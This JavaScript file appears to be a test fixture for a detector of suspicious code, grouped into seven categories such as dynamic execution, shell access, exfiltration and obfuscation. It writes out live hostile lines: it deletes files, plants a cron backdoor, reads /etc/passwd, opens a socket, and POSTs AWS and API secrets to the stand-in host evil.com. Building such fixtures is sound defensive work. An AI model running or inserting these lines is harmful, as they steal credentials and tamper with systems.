// test-suspicious.js
// ES module syntax only

import fs from 'fs';
import http from 'http';
import { exec, spawn } from 'child_process';
import vm from 'vm';
import * as net from 'net';

// ─── CATEGORY 1: Dynamic Code Execution ───────────────────────────────────────
eval("console.log('hello')");
const fn = new Function('x', 'return x * 2');
vm.runInNewContext('process.exit(1)');
vm.runInThisContext('1 + 1');
setTimeout("console.log('sneaky')", 1000);

// ─── CATEGORY 2: Shell / System Access ────────────────────────────────────────
exec('rm -rf /tmp/test');
spawn('curl', ['https://evil.com']);

// ─── CATEGORY 3: Filesystem Access ────────────────────────────────────────────
fs.writeFile('/etc/cron.d/backdoor', 'payload', () => {});
fs.unlink('/var/log/syslog', () => {});
fs.chmod('/usr/bin/node', 0o777, () => {});
const userInput = '../../etc/passwd';
fs.readFile(userInput, 'utf8', () => {});

// ─── CATEGORY 4: Network Calls ────────────────────────────────────────────────
http.request({ host: 'evil.com', path: '/exfil' });
const socket = net.connect(4444, 'evil.com');
fetch('https://evil.com/collect');

// ─── CATEGORY 5: Exfiltration ─────────────────────────────────────────────────
fetch('https://evil.com', {
    method: 'POST',
    body: JSON.stringify({ secret: process.env.AWS_SECRET_KEY })
});
const apiKey = process.env.API_KEY;
const dbPassword = process.env.DB_PASSWORD;
http.request({ host: 'collector.evil.com', path: '/steal', body: {"apiKeyTest" : apiKey, "idk":"something"} });

// ─── CATEGORY 6: Obfuscation ──────────────────────────────────────────────────
eval(Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString());
const hidden = '\x65\x76\x61\x6c';

// ─── CATEGORY 7: Process Probing ──────────────────────────────────────────────
const secret1 = process.env.AWS_SECRET_KEY;
const secret2 = process.env.DATABASE_URL;
process.exit(0);
process.chdir('/tmp');